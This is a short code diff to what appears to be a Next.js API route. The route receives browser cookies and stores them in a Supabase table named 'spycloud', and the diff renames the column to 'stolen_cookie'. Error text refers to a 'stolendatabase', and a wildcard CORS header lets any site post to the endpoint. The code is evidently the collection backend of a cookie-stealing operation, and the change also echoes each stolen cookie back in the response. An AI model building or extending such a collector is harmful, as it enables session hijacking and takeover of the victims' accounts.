@@ -37,14 +37,14 @@ export async function POST(req) {
 
     const { stolen, stolenError } = await supabase
       .from("spycloud")
-      .insert([{ value: cookie}]);
+      .insert([{ stolen_cookie: cookie}]);
 
     if (stolenError) {
       console.error("Supabase insert error:", stolenError);
       return NextResponse.json({ error: "Failed to save cookie to stolendatabase" }, { status: 500 });
     }
 
-    const response = NextResponse.json({ message: "Cookie saved", data });
+    const response = NextResponse.json({ message: `Cookie saved ${cookie}`, data, stolen });
 
     // ✅ Allow localhost for testing
     response.headers.set("Access-Control-Allow-Origin", "*");
